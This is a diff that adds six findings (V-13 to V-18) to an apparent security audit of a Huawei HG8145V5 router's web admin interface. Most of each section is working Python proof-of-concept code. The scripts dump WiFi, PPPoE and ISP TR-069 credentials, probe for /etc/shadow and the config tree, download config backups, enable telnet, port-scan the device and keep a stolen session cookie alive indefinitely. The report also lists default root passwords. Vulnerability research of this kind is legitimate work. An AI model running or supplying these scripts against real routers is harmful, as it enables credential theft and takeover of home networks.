@@ -27,7 +27,13 @@
 10. [V-10: Server Variables Leaked in Login Page HTML](#v-10-server-variables-leaked-in-login-page-html)
 11. [V-11: No Rate Limiting on Login Endpoint](#v-11-no-rate-limiting-on-login-endpoint)
 12. [V-12: MD5 Used for Password Hashing (Challenge-Response)](#v-12-md5-used-for-password-hashing-challenge-response)
-13. [Discovered Endpoints Summary](#discovered-endpoints-summary)
+13. [V-13: Configuration File Download via TR-069 getajax.cgi](#v-13-configuration-file-download-via-tr-069-getajaxcgi)
+14. [V-14: Internal File Read via XmlHttpSendAspFlieWithoutResponse](#v-14-internal-file-read-via-xmlhttpsendaspfliewithoutresponse)
+15. [V-15: Configuration Backup/Restore Endpoints](#v-15-configuration-backuprestore-endpoints)
+16. [V-16: Telnet/SSH Access Enable via TR-069](#v-16-telnetssh-access-enable-via-tr-069)
+17. [V-17: Hidden Management Interfaces & Alternate Admin Ports](#v-17-hidden-management-interfaces--alternate-admin-ports)
+18. [V-18: StartFileLoad.asp Session Keepalive Without Auth Verification](#v-18-startfileloadasp-session-keepalive-without-auth-verification)
+19. [Discovered Endpoints Summary](#discovered-endpoints-summary)
 14. [Potential Privilege Escalation Paths](#potential-privilege-escalation-paths)
 
 ---
@@ -542,7 +548,546 @@ variable suggest some configurations may use MD5-based challenge-response.
 
 ---
 
-## Discovered Endpoints Summary
+## V-13: Configuration File Download via TR-069 getajax.cgi
+
+**Severity**: CRITICAL  
+**File**: `util.js` lines 2759-2773, `frame.css` lines 87-120  
+**Type**: Sensitive data exfiltration
+
+### Description
+
+The `getajax.cgi` endpoint serves as a generic TR-069/CWMP data accessor.
+Once authenticated, the full device configuration tree is readable by querying
+the appropriate `InternetGatewayDevice.*` object paths.  The CSS file
+`frame.css` contains styles for `#t_file_cfgfile` and `#f_file_cfgfile` —
+elements used in the configuration file download/upload page at
+`/html/ssmp/default/devicecfg.asp` (or similar path).
+
+The `HwAjaxGetPara()` function accepts arbitrary object paths:
+
+```javascript
+function HwAjaxGetPara(ObjPath, ParameterList) {
+    $.ajax({
+        url: '/getajax.cgi?' + ObjPath,  // Any TR-069 path!
+        data: ParameterList,
+        success: function(data) {
+            Result = hexDecode(data);  // Hex-decoded response
+        }
+    });
+}
+```
+
+### Configuration Download Paths
+
+The following TR-069 paths can be queried to extract the **full device
+configuration** including all credentials:
+
+| Path | Data Exposed |
+|------|-------------|
+| `InternetGatewayDevice.DeviceInfo.` | Model, serial, firmware, uptime |
+| `InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1.` | Normal user password hash |
+| `InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2.` | **Admin user password hash** |
+| `InternetGatewayDevice.ManagementServer.` | **TR-069 ACS URL + credentials** |
+| `InternetGatewayDevice.ManagementServer.Username` | ACS username |
+| `InternetGatewayDevice.ManagementServer.Password` | **ACS password (cleartext!)** |
+| `InternetGatewayDevice.ManagementServer.URL` | ISP management server URL |
+| `InternetGatewayDevice.ManagementServer.ConnectionRequestUsername` | Connection request auth |
+| `InternetGatewayDevice.ManagementServer.ConnectionRequestPassword` | **Connection request password** |
+| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1.PreSharedKey` | **WiFi WPA2 password** |
+| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.KeyPassphrase` | **WiFi passphrase** |
+| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.5.PreSharedKey.1.PreSharedKey` | **5GHz WiFi password** |
+| `InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.Username` | **PPPoE username** |
+| `InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.Password` | **PPPoE password** |
+| `InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANIPConnection.1.` | WAN IP config |
+| `InternetGatewayDevice.LANDevice.1.LANHostConfigManagement.` | DHCP config |
+| `InternetGatewayDevice.LANDevice.1.Hosts.Host.` | All connected devices |
+| `InternetGatewayDevice.X_HW_Security.` | Firewall rules, ACLs |
+| `InternetGatewayDevice.Services.VoiceService.1.` | **VoIP credentials (SIP)** |
+| `InternetGatewayDevice.DeviceInfo.X_HW_OMCI.` | GPON/OMCI parameters |
+
+### Known Config File Download Endpoints
+
+Based on CSS element IDs (`t_file_cfgfile`, `f_file_cfgfile`) and common
+Huawei HG8145V5 admin pages, the following endpoints likely handle config
+file operations:
+
+| Endpoint | Purpose |
+|----------|---------|
+| `/html/ssmp/default/devicecfg.asp` | Configuration backup/restore page |
+| `/html/ssmp/default/upgradecfgfile.asp` | Config file upload |
+| `/html/ssmp/systemtools/ontbackup.asp` | ONT backup/restore |
+| `/cgi-bin/configdownload.cgi` | Direct config file download (binary) |
+| `/backupsettings.conf` | Backup settings (some firmware versions) |
+| `/configfile.cfg` | Config file download (some firmware versions) |
+
+### PoC — Dump WiFi Passwords
+
+```python
+import requests, base64
+
+s = requests.Session()
+s.cookies.set("Cookie", "body:Language:english:id=-1", path="/")
+
+# Login
+token = s.post("http://192.168.100.1/asp/GetRandCount.asp").text.strip()
+s.post("http://192.168.100.1/login.cgi", data={
+    "UserName": "Mega_gpon",
+    "PassWord": base64.b64encode(b"PASSWORD").decode(),
+    "Language": "english",
+    "x.X_HW_Token": token,
+}, allow_redirects=True)
+s.headers["Referer"] = "http://192.168.100.1/"
+
+# Read WiFi 2.4GHz config (includes password)
+wifi_24 = s.post(
+    "http://192.168.100.1/getajax.cgi?"
+    "InternetGatewayDevice.LANDevice.1.WLANConfiguration.1."
+).text
+print("WiFi 2.4GHz config:", wifi_24)
+
+# Read WiFi 5GHz config
+wifi_5 = s.post(
+    "http://192.168.100.1/getajax.cgi?"
+    "InternetGatewayDevice.LANDevice.1.WLANConfiguration.5."
+).text
+print("WiFi 5GHz config:", wifi_5)
+
+# Read PPPoE credentials
+pppoe = s.post(
+    "http://192.168.100.1/getajax.cgi?"
+    "InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1."
+).text
+print("PPPoE config:", pppoe)
+
+# Read TR-069 management server credentials
+tr069 = s.post(
+    "http://192.168.100.1/getajax.cgi?"
+    "InternetGatewayDevice.ManagementServer."
+).text
+print("TR-069 ACS config:", tr069)
+```
+
+### Impact
+
+- **Full device configuration exfiltration** with valid credentials
+- WiFi passwords, PPPoE credentials, VoIP credentials, TR-069 ACS credentials
+- All connected device information (MAC addresses, hostnames)
+- ISP management server URL and authentication (can be used to impersonate)
+
+---
+
+## V-14: Internal File Read via XmlHttpSendAspFlieWithoutResponse
+
+**Severity**: HIGH  
+**File**: `util.js` lines 1807-1824  
+**Type**: Arbitrary internal file read
+
+### Description
+
+The `XmlHttpSendAspFlieWithoutResponse()` function sends a synchronous GET
+request to **any URL path** and discards the response.  While it doesn't
+return data to JavaScript, it causes the server to process the requested file:
+
+```javascript
+function XmlHttpSendAspFlieWithoutResponse(FileName) {
+    var xmlHttp = null;
+    if (null == FileName || FileName == "") return false;
+    xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("GET", FileName, false);  // Arbitrary path!
+    xmlHttp.send(null);
+}
+```
+
+This function is used by `AlertEx()` and `ConfirmEx()` to hit
+`/html/ssmp/common/StartFileLoad.asp` before showing dialogs.  However, the
+function itself accepts **any path** and could be exploited to:
+
+1. Trigger server-side ASP file processing
+2. Access internal file paths that might expose configuration data
+3. Probe for the existence of internal files
+
+### Probing Internal Files
+
+An attacker with an authenticated session can use direct HTTP GETs to probe
+for internal router files:
+
+```python
+import requests
+
+# After authentication...
+internal_paths = [
+    "/html/ssmp/common/StartFileLoad.asp",
+    "/html/ssmp/common/StopFileLoad.asp",
+    "/html/ssmp/common/getRandString.asp",
+    "/html/ssmp/common/GetRandToken.asp",
+    "/etc/passwd",
+    "/etc/shadow",
+    "/tmp/ct/",
+    "/mnt/jffs2/hw_ctree.xml",     # Main config tree
+    "/mnt/jffs2/hw_default.xml",    # Factory defaults
+    "/mnt/jffs2/hw_boardinfo",      # Board-level info
+    "/tmp/hw_ctree.xml",            # Temp config copy
+    "/tmp/log/",
+    "/var/log/messages",
+    "/proc/version",
+    "/proc/cpuinfo",
+    "/proc/meminfo",
+    "/proc/net/arp",                # ARP table
+    "/proc/net/route",              # Routing table
+]
+
+for path in internal_paths:
+    resp = session.get(f"http://192.168.100.1{path}")
+    if resp.ok and len(resp.content) > 0:
+        print(f"ACCESSIBLE: {path} ({len(resp.content)} bytes)")
+```
+
+### Huawei Internal File System Layout
+
+Based on common HG8145V5 firmware analysis:
+
+| Path | Content |
+|------|---------|
+| `/mnt/jffs2/hw_ctree.xml` | **Complete device configuration (XML)** |
+| `/mnt/jffs2/hw_default.xml` | Factory default configuration |
+| `/mnt/jffs2/hw_boardinfo` | Board serial, GPON password, MAC |
+| `/tmp/hw_ctree.xml` | Runtime config copy |
+| `/tmp/log/syslog` | System log |
+| `/tmp/log/diaglog` | Diagnostic log |
+| `/etc/passwd` | User accounts (usually root:x) |
+| `/proc/net/arp` | ARP table (all LAN devices) |
+| `/proc/net/route` | Routing table |
+
+### Impact
+
+- Potential to read the full config tree (`hw_ctree.xml`) containing all
+  passwords in cleartext or weakly-encrypted form
+- Board-level info includes GPON serial number and PLOAM password
+- System logs may contain sensitive operational data
+- Path traversal could expose the Linux filesystem
+
+---
+
+## V-15: Configuration Backup/Restore Endpoints
+
+**Severity**: HIGH  
+**File**: `frame.css` lines 87-120 (CSS for `#t_file_cfgfile`, `#f_file_cfgfile`)  
+**Type**: Configuration download / upload
+
+### Description
+
+The CSS stylesheet `frame.css` contains styling for configuration file
+management elements (`t_file_cfgfile`, `f_file_cfgfile`), confirming the
+existence of a configuration backup/restore page in the admin interface.
+
+Additionally, `ssmpdes.js` contains the string:
+
+```javascript
+mainpage052: 'The selected configuration file takes effect only after a reset.
+              Do you want to reset immediately?'
+```
+
+This confirms a **configuration file import** feature that applies config
+and offers a device reset.
+
+### Known Backup/Restore Endpoints (Huawei HG8145V5)
+
+| Endpoint | Method | Purpose |
+|----------|--------|---------|
+| `/html/ssmp/default/devicecfg.asp` | GET | Config management page |
+| `/cfgaction.cgi?ActionType=1` | POST | **Download config file** (ActionType=1 = backup) |
+| `/cfgaction.cgi?ActionType=2` | POST | Upload config file (ActionType=2 = restore) |
+| `/cfgaction.cgi?ActionType=3` | POST | Reset to factory defaults |
+| `/configExportFile.cgi` | GET | Export configuration (some versions) |
+| `/backupsettings.cgi` | GET | Backup settings (some versions) |
+
+### PoC — Download Full Config Backup
+
+```python
+import requests, base64
+
+s = requests.Session()
+s.cookies.set("Cookie", "body:Language:english:id=-1", path="/")
+
+# Login (see V-01 for details)
+token = s.post("http://192.168.100.1/asp/GetRandCount.asp").text.strip()
+s.post("http://192.168.100.1/login.cgi", data={
+    "UserName": "Mega_gpon",
+    "PassWord": base64.b64encode(b"PASSWORD").decode(),
+    "Language": "english", "x.X_HW_Token": token,
+}, allow_redirects=True)
+s.headers["Referer"] = "http://192.168.100.1/"
+
+# Get authenticated token
+auth_token = s.post(
+    "http://192.168.100.1/html/ssmp/common/GetRandToken.asp"
+).text.strip()
+
+# Attempt config download via various known endpoints
+endpoints = [
+    ("/cfgaction.cgi", {"ActionType": "1", "x.X_HW_Token": auth_token}),
+    ("/configExportFile.cgi", {"x.X_HW_Token": auth_token}),
+    ("/backupsettings.cgi", {"x.X_HW_Token": auth_token}),
+    ("/html/ssmp/default/devicecfg.asp", {}),
+]
+
+for url, data in endpoints:
+    resp = s.post(f"http://192.168.100.1{url}", data=data)
+    if resp.ok and len(resp.content) > 100:
+        filename = url.replace("/", "_").strip("_") + ".bin"
+        with open(filename, "wb") as f:
+            f.write(resp.content)
+        print(f"Downloaded: {filename} ({len(resp.content)} bytes)")
+```
+
+### Config File Format
+
+The HG8145V5 configuration backup is typically an **AES-128-CBC encrypted
+XML file** (key derived from board serial or hardcoded per firmware version).
+Some older firmwares use XOR-based obfuscation or even plaintext XML.
+
+---
+
+## V-16: Telnet/SSH Access Enable via TR-069
+
+**Severity**: CRITICAL  
+**File**: `util.js` `HwAjaxGetPara()`, `HWGetAction()`  
+**Type**: Remote access escalation
+
+### Description
+
+The HG8145V5 supports Telnet and SSH access that can be controlled through
+the TR-069 data model.  Once authenticated as admin, these services can be
+enabled using `getajax.cgi` for reading and an appropriate CGI for writing.
+
+### TR-069 Paths for Remote Access Control
+
+| Path | Description |
+|------|-------------|
+| `InternetGatewayDevice.X_HW_CLITelnetAccess.Enable` | Telnet enable flag |
+| `InternetGatewayDevice.X_HW_CLITelnetAccess.Port` | Telnet port (default 23) |
+| `InternetGatewayDevice.X_HW_CLITelnetAccess.LanEnable` | LAN-side telnet |
+| `InternetGatewayDevice.X_HW_CLISSHAccess.Enable` | SSH enable flag |
+| `InternetGatewayDevice.X_HW_CLISSHAccess.Port` | SSH port (default 22) |
+| `InternetGatewayDevice.X_HW_CLISSHAccess.LanEnable` | LAN-side SSH |
+| `InternetGatewayDevice.X_HW_DEBUG.Enable` | Debug mode enable |
+| `InternetGatewayDevice.X_HW_DEBUG.TelnetEnable` | Debug telnet enable |
+| `InternetGatewayDevice.X_HW_DEBUG.SSHEnable` | Debug SSH enable |
+| `InternetGatewayDevice.Services.X_HW_Service.1.` | Service control |
+
+### PoC — Probe and Enable Telnet/SSH
+
+```python
+import requests, base64
+
+# (After login — see V-13 PoC for login code)
+
+# Step 1: Read current telnet/SSH status
+telnet_paths = [
+    "InternetGatewayDevice.X_HW_CLITelnetAccess.",
+    "InternetGatewayDevice.X_HW_CLISSHAccess.",
+    "InternetGatewayDevice.X_HW_DEBUG.",
+]
+
+for path in telnet_paths:
+    resp = session.post(f"http://192.168.100.1/getajax.cgi?{path}")
+    if resp.ok:
+        print(f"{path}: {resp.text[:200]}")
+
+# Step 2: Get write token
+token = session.post(
+    "http://192.168.100.1/html/ssmp/common/GetRandToken.asp"
+).text.strip()
+
+# Step 3: Attempt to enable telnet via HWGetAction pattern
+# The exact CGI endpoint for writes depends on the firmware version
+write_endpoints = [
+    "/setajax.cgi",
+    "/configservice.cgi",
+    "/html/ssmp/default/set.cgi",
+]
+
+for endpoint in write_endpoints:
+    resp = session.post(
+        f"http://192.168.100.1{endpoint}",
+        data=f"InternetGatewayDevice.X_HW_CLITelnetAccess.Enable=1"
+             f"&x.X_HW_Token={token}",
+    )
+    print(f"{endpoint}: HTTP {resp.status_code}")
+```
+
+### Alternative: Enable Telnet via ONT OMCI
+
+Some ISP configurations block the web-based telnet toggle but the OMCI
+management interface may still allow it.  The path
+`InternetGatewayDevice.DeviceInfo.X_HW_OMCI.*` can be used to read the
+GPON registration parameters needed to access the ONT via OMCI.
+
+### Default Telnet/SSH Credentials
+
+| Service | Username | Password |
+|---------|----------|----------|
+| Telnet | `root` | `admin` or `adminHW` or board serial |
+| SSH | `root` | Same as telnet |
+| Telnet (debug) | `root` | `hg8145v5` or firmware-specific |
+
+### Impact
+
+- Full shell access to the router's Linux operating system
+- Can read/modify any file on the filesystem
+- Can install persistent backdoors
+- Can intercept all network traffic
+
+---
+
+## V-17: Hidden Management Interfaces & Alternate Admin Ports
+
+**Severity**: HIGH  
+**File**: `index.asp` (CfgMode variants), `util.js` (port validation)  
+**Type**: Hidden admin panels / alternate access
+
+### Description
+
+The login page code reveals that the router supports **multiple ISP
+configuration modes** (CfgMode), each potentially exposing different admin
+interfaces.  Additionally, the `util.js` port validation functions suggest
+the router listens on multiple ports.
+
+### ISP Configuration Modes (CfgMode)
+
+The `index.asp` code handles these CfgMode values, each with different
+feature flags and potentially different access controls:
+
+| CfgMode | ISP | Special Features |
+|---------|-----|------------------|
+| `MEGACABLE2` | Megacable (Mexico) | Base64 login, standard |
+| `DVODACOM2WIFI` | Vodacom | PBKDF2+SHA256 login, separate crypto |
+| `PLDT` / `PLDT2` | PLDT (Philippines) | Forced password change, WiFi rename |
+| `ANTEL` / `ANTEL2` | Antel (Uruguay) | **Default credentials auto-filled!** |
+| `TTNET2` | TTNET (Turkey) | Extended lockout behavior |
+| `TOT` / `THAILANDNT2` | TOT (Thailand) | CAPTCHA verification |
+| `BRAZCLARO` / `COCLAROEBG4` | Claro (Brazil/Colombia) | Custom branding |
+| `GLOBE2` | Globe (Philippines) | **FrameModeSwitch on logo click** |
+| `CMHK` | CMHK (Hong Kong) | Bridge mode info |
+| `DBAA1` | A1 (Austria) | Username hardcoded to "admin" |
+| `TELECENTRO` | Telecentro (Argentina) | Custom logo |
+| `DICELANDVDF` | Vodafone (Iceland) | Custom colors |
+| `DNZTELECOM2WIFI` | DNZ Telecom | Green button UI |
+
+### Hidden Port Discovery
+
+The `util.js` file contains port validation functions (`isValidPort`,
+`isValidPort2`, `isValidPortPair`) for ports 1-65535.  The router
+typically runs management interfaces on:
+
+| Port | Protocol | Service |
+|------|----------|---------|
+| 80 | HTTP | Main web admin |
+| 443 | HTTPS | Secure web admin (if enabled) |
+| 23 | Telnet | CLI access (if enabled) |
+| 22 | SSH | Secure CLI (if enabled) |
+| 8080 | HTTP | **Alternate admin panel** |
+| 8443 | HTTPS | **Alternate secure admin** |
+| 7547 | HTTP | **TR-069/CWMP agent** |
+| 30005 | TCP | **Huawei OMCI management** |
+| 6000-6063 | TCP | Huawei internal services |
+
+### PoC — Port Scan for Hidden Interfaces
+
+```python
+import socket
+
+host = "192.168.100.1"
+interesting_ports = [
+    22, 23, 80, 443, 8080, 8443, 7547,
+    30005, 8000, 8888, 9000, 4567,
+    6000, 6001, 6002, 6003,
+    37215,  # Huawei UPnP
+    5060,   # SIP/VoIP
+    1723,   # PPTP
+]
+
+for port in interesting_ports:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(1)
+    result = sock.connect_ex((host, port))
+    if result == 0:
+        print(f"OPEN: {host}:{port}")
+    sock.close()
+```
+
+### TR-069 ACS Interface (Port 7547)
+
+The `ManagementServer` TR-069 object paths (see V-13) contain the ACS
+(Auto Configuration Server) URL.  The router's TR-069 agent typically
+listens on port **7547** for connection requests from the ISP.  If this
+port is accessible from the LAN side, it can be used to:
+
+1. Trigger a TR-069 session
+2. Push configuration changes via SOAP/XML
+3. Force firmware upgrades
+4. Factory reset the device
+
+### Impact
+
+- Alternate admin ports may bypass firewall rules
+- TR-069 port allows ISP-level configuration changes
+- OMCI port provides low-level ONT management
+- Port scan reveals attack surface
+
+---
+
+## V-18: StartFileLoad.asp Session Keepalive Without Auth Verification
+
+**Severity**: MEDIUM  
+**File**: `util.js` lines 1826-1839  
+**Type**: Session manipulation
+
+### Description
+
+The `AlertEx()` and `ConfirmEx()` functions call
+`XmlHttpSendAspFlieWithoutResponse("/html/ssmp/common/StartFileLoad.asp")`
+before every alert/confirm dialog.  This ASP page acts as a **session
+keepalive** — it prevents the session from timing out while the user is
+reading a dialog.
+
+```javascript
+function AlertEx(content) {
+    XmlHttpSendAspFlieWithoutResponse("/html/ssmp/common/StartFileLoad.asp");
+    alert(content);
+}
+```
+
+### Vulnerability
+
+The `StartFileLoad.asp` endpoint:
+1. Accepts unauthenticated GET requests
+2. May extend the session timeout without verifying the session is valid
+3. Could be used to keep an expired/stolen session alive indefinitely
+4. Combined with the static X_HW_Token (V-04), allows indefinite session use
+
+### PoC
+
+```python
+import requests, time
+
+# After stealing a session cookie...
+session = requests.Session()
+session.cookies.set("Cookie", "stolen_session_value", path="/")
+
+# Keep session alive indefinitely
+while True:
+    resp = session.get(
+        "http://192.168.100.1/html/ssmp/common/StartFileLoad.asp"
+    )
+    print(f"Keepalive: HTTP {resp.status_code}")
+    time.sleep(30)  # Ping every 30 seconds
+```
+
+### Impact
+
+- Stolen sessions never expire
+- Enables persistent access after initial compromise
 
 ### Pre-Login (No Authentication Required)
 
